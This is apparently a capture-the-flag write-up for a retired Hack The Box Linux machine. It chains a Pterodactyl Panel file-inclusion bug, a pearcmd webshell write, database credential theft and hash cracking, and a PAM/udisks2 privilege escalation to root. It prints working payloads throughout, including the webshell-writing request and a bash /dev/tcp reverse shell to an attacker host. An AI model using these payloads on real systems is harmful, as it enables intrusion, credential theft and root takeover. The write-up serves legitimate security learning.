# Pterodactyl

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--02--07-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | February 7, 2026 |
| **Rating** | 3 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Pterodactyl Panel v1.11.10 is vulnerable to **CVE-2025-49132**, a local file inclusion in the locale translation endpoint. Combined with `register_argc_argv=On` and PHP's bundled `pearcmd.php`, the LFI becomes a full RCE: a single query string does double duty, parsed by `$_GET` for the traversal and by PHP's argv splitter as pearcmd arguments, writing a webshell. Database credentials from the Laravel config yield a crackable bcrypt hash and SSH as `phileasfogg3`. Sudo is `(ALL) ALL` but with `targetpw` set, so root comes instead from chaining **CVE-2025-6018** (SUSE PAM grants `allow_active`) with **CVE-2025-6019** (udisks2 mounts a crafted XFS image without `nosuid`) for a SUID root shell.

---

**Stack:** openSUSE Leap 15.6, nginx 1.21.5, PHP 8.4.8 (FPM), Laravel, MariaDB 11.8.3, Pterodactyl Panel v1.11.10

**Vhosts:** `pterodactyl.htb`, `panel.pterodactyl.htb`
## Attack Chain Summary

```
CVE-2025-49132 (LFI) → pearcmd.php config-create (webshell) → RCE as wwwrun
    → MySQL credential dump → bcrypt crack → SSH as phileasfogg3
        → CVE-2025-6018 (PAM allow_active) + CVE-2025-6019 (udisks2 XFS SUID) → root
```

---

## Phase 1: Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key ports:
- **22** — OpenSSH
- **80** — nginx 1.21.5 (Pterodactyl Panel)

### Virtual Host Discovery

Add to `/etc/hosts`:

```
<TARGET_IP>  pterodactyl.htb  panel.pterodactyl.htb
```

- `pterodactyl.htb` — Default nginx page
- `panel.pterodactyl.htb` — Pterodactyl Panel v1.11.10 (React SPA with Laravel backend)

---

## Phase 2: CVE-2025-49132 — Local File Inclusion

Pterodactyl Panel v1.11.10 has an LFI vulnerability in the locale translation endpoint. Laravel's `LocaleController` constructs a file path from user-controlled `locale` and `namespace` parameters:

```php
// Internally executes:
require "{$lang_path}/{$locale}/{$namespace}.php"
// Default: /var/www/pterodactyl/resources/lang/{locale}/{namespace}.php
```

The `.php` extension is always appended. Path traversal via `locale` allows including arbitrary `.php` files on the filesystem.

### Extracting Configuration

```bash
# Extract database config
curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database'
```

This revealed:
- **DB Credentials:** `pterodactyl:PteraPanel` @ `127.0.0.1:3306/panel`
- **APP_KEY:** `base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=`
- **HASHIDS_SALT:** `pKkOnx0IzJvaUXKWt2PK`

Additional configs extracted: `app`, `session`, `cache`, `mail`, etc. — all 17 Laravel config files were accessible.

### Confirming PHP Environment

```bash
# Include phpinfo (if available)
curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../tmp&namespace=phpinfo'
```

Key PHP settings confirmed:
- `register_argc_argv`: **On** (enables PEAR argv injection)
- `disable_functions`: **(none)**
- `open_basedir`: **(none)**
- `include_path`: `.:/usr/share/php8:/usr/share/php/PEAR`

---

## Phase 3: LFI to RCE via pearcmd.php

### The Technique

When `register_argc_argv=On`, PHP-FPM sets `$_SERVER['argv']` by splitting the query string on `+` characters. If we can include `pearcmd.php` via the LFI, PEAR will parse these argv values as command-line arguments.

The `config-create` command writes a PEAR configuration file to a specified path, with attacker-controlled content embedded in the config values. By injecting PHP code into the "root directory" argument, the written config file becomes a PHP webshell.

### The Payload Structure

The critical insight is how to structure the query string so that:
1. Laravel's `$_GET` parser extracts `locale` and `namespace` correctly for the LFI
2. PHP's argv splitting on `+` gives pearcmd valid command arguments

```
?+config-create+/&locale=TRAVERSAL&namespace=pearcmd&/<?=PAYLOAD?>+/output/path.php
```

How this parses:

| Parser | What it sees |
|--------|-------------|
| **$_GET['locale']** | `../../../../usr/share/php/PEAR` (LFI traversal) |
| **$_GET['namespace']** | `pearcmd` (includes pearcmd.php) |
| **argv (split on +)** | `["", "config-create", "/&locale=...&namespace=pearcmd&/<?=PAYLOAD?>", "/tmp/shell.php"]` |

### Writing the Webshell

```bash
curl -s --globoff \
  'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_GET[0]);?>+/tmp/syre1710.php'
```

**Success indicators:** Response contains `#PEAR_Config`, `CONFIGURATION`, or serialized PHP array content — this means pearcmd executed and wrote the config file.

**Note on traversal depth:** The base path is `/var/www/pterodactyl/resources/lang/`. Five levels of `../` were needed to reach `/usr/share/php/PEAR/pearcmd.php`. The correct depth was `../../../../../usr/share/php/PEAR`.

### Executing the Webshell

```bash
# Verify RCE
curl -s --globoff \
  'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=syre1710&0=id'
```

**Output (embedded in PEAR config):**

```
uid=474(wwwrun) gid=477(www) groups=477(www)
```

The webshell output is mixed into the PEAR serialized config structure, but the command output is clearly visible.

### Reverse Shell

Start listener:

```bash
nc -lvnp 9002
```

Trigger reverse shell:

```bash
curl -s --globoff \
  'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=syre1710&0=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<ATTACKER_IP>%2F9002%200%3E%261%27'
```

Shell received as `wwwrun` (uid 474).

---

## Phase 4: Post-Exploitation as wwwrun

### MySQL Database Dump

The DB password from `.env` (`PteraPanel`) only worked via TCP, not the unix socket:

```bash
mariadb -u pterodactyl -pPteraPanel -D panel -h 127.0.0.1 \
  -e "SELECT id,username,password FROM users;"
```

| id | username | password (bcrypt) |
|----|----------|-------------------|
| 2 | headmonitor | `$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2` |
| 3 | phileasfogg3 | `$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi` |

### Wings Daemon Configuration

```bash
cat /etc/pterodactyl/config.yml
```

Revealed daemon token, Docker network config, and importantly: `system.user.uid: 1001` (headmonitor's UID).

### System Users

```bash
grep bash /etc/passwd
```

- `root` — uid 0
- `headmonitor` — uid 1001
- `phileasfogg3` — uid 1002

### Cracking Bcrypt Hashes

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked:**
- `phileasfogg3` → `!QAZ2wsx` (keyboard walk pattern: Shift+1, Q, A, Z, 2, w, s, x)

---

## Phase 5: User Flag

### SSH as phileasfogg3

```bash
ssh phileasfogg3@<TARGET_IP>
# Password: !QAZ2wsx
```

```bash
cat ~/user.txt
# [flag redacted]
```

The user flag was in `/home/phileasfogg3/user.txt`, readable by wwwrun as well since the home directory had `drwxr-xr-x` permissions.

---

## Phase 6: Privilege Escalation to Root

### Sudo Configuration

```bash
sudo -l
```

```
User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL
```

However, the `targetpw` default is set — sudo requires the **target user's password**, not the invoking user's password. So `sudo su` asks for root's password, which we don't have.

### The Hint: Email from headmonitor

```bash
cat /var/spool/mail/phileasfogg3
```

```
From: headmonitor
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)

Unusual activity has been observed from the udisks daemon (udisksd).
No confirmed compromise at this time, but increased vigilance is required.
```

This email is the box creator's hint pointing to **udisksd** as the privilege escalation vector.

### CVE-2025-6018 + CVE-2025-6019: PAM + udisks2 LPE Chain

**CVE-2025-6018** — On openSUSE Leap 15/SUSE Enterprise 15, the PAM configuration allows an SSH user to set `XDG_SEAT` and `XDG_VTNR` environment variables via `~/.pam_environment`, tricking `pam_systemd` into granting `allow_active` status (normally reserved for physically present users).

**CVE-2025-6019** — The `udisks` daemon allows `allow_active` users to resize filesystems. When resizing XFS, `libblockdev` temporarily mounts the filesystem in `/tmp` **without** `nosuid`/`nodev` flags. An attacker can plant a SUID-root shell in a crafted XFS image.

Reference: [Qualys Advisory](https://www.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt)

### Step 1: Become allow_active (CVE-2025-6018)

```bash
echo 'XDG_SEAT OVERRIDE=seat0' > ~/.pam_environment
echo 'XDG_VTNR OVERRIDE=1' >> ~/.pam_environment
```

Log out and SSH back in:

```bash
exit
ssh phileasfogg3@<TARGET_IP>
```

Verify:

```bash
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
# Returns: ('yes',)  ← confirmed allow_active
```

### Step 2: Create Malicious XFS Image (on attacker machine)

```bash
dd if=/dev/zero of=./xfs.image bs=1M count=300
mkfs.xfs ./xfs.image
mkdir ./xfs.mount
sudo mount -t xfs ./xfs.image ./xfs.mount
sudo cp /bin/bash ./xfs.mount/
sudo chmod 04555 ./xfs.mount/bash
sudo umount ./xfs.mount
scp ./xfs.image phileasfogg3@<TARGET_IP>:~/
```

### Step 3: Exploit udisks2 (CVE-2025-6019)

On the target (as phileasfogg3 with allow_active):

```bash
# Kill volume monitor to prevent premature mounting
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null

# Set up loop device backed by our XFS image
udisksctl loop-setup --file ./xfs.image --no-user-interaction
# Output: Mapped file ./xfs.image as /dev/loop0.

# Background loop to catch the SUID bash before unmount
while true; do
  /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break
done 2>/dev/null &

# Trigger the resize — libblockdev mounts XFS WITHOUT nosuid
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
# Error about "target is busy" is EXPECTED — means our loop caught it
```

### Step 4: Get Root

```bash
/tmp/blockdev*/bash -p
```

```bash
id
# uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)

cat /root/root.txt
# [flag redacted]
```

---

## Key Takeaways

1. **CVE-2025-49132** is not just an information disclosure — combined with `register_argc_argv=On` and pearcmd.php, it's a full RCE chain. The trick is structuring the query string so `&key=value&` pairs serve double duty: parsed by PHP's `$_GET` for the LFI, and embedded within pearcmd's argv for command injection.

2. **Nginx caching** (`max-age=3600`) can mask successful exploitation. Using unique filenames for each attempt or resetting the box avoids stale cached responses.

3. **The `targetpw` sudo setting** is a common HTB trap — having `(ALL) ALL` sudo access is useless without the target user's password. The real privesc path was through the CVE chain hinted at in the mail.

4. **CVE-2025-6018 + CVE-2025-6019** is a powerful chain specific to SUSE/openSUSE: PAM misconfiguration grants fake physical presence → udisks2 mounts XFS without nosuid → SUID bash = root. The email from headmonitor about "unusual udisksd activity" was the intentional breadcrumb.

---

## Tools Used

- nmap, curl, hashcat
- MariaDB client
- mkfs.xfs, udisksctl, gdbus
- Netcat (reverse shell listener)

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
